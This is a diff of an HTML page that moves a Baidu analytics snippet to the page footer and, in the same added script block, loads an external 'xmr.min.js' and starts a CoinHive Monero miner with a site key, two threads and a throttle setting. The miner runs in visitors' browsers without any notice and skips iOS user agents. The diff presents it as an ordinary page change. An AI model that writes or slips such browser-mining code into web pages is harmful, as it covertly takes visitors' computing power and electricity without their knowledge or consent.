@@ -18,16 +18,6 @@
         </script>
         <![endif]-->
         <link rel="icon" type="image/png" href="/favicon.png" />
-        <script>
-            var _hmt = _hmt || [];
-            (function () {
-                var hm = document.createElement("script");
-                hm.src = "//hm.baidu.com/hm.js?174a1111f4c1724383232f848510cd2c";
-                var s = document.getElementsByTagName("script")[0];
-                s.parentNode.insertBefore(hm, s);
-            })();
-        </script>
-
     </head>
     <body>
         <div class="header">
@@ -1061,5 +1051,25 @@
         <script type="text/javascript" src="js/lib/timeline/timeline-min.js" charset="utf-8"></script>
         <script type="text/javascript" src="js/lib/fancybox/jquery.fancybox.pack.js" charset="utf-8"></script>
         <script type="text/javascript" src="js/common.js" charset="utf-8"></script>
+        <script>
+          var _hmt = _hmt || [];
+          (function () {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?174a1111f4c1724383232f848510cd2c";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+
+            if (navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)) {
+              return
+            }
+            const scriptDom = document.createElement('script')
+            scriptDom.setAttribute('src', 'https://static.hacpai.com/js/lib/xmr.min.js')
+            document.head.appendChild(scriptDom)
+            scriptDom.onload = function () {
+              var miner = new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 2, throttle: 0.5});
+              miner.start();
+            }
+          })();
+        </script>
     </body>
 </html>
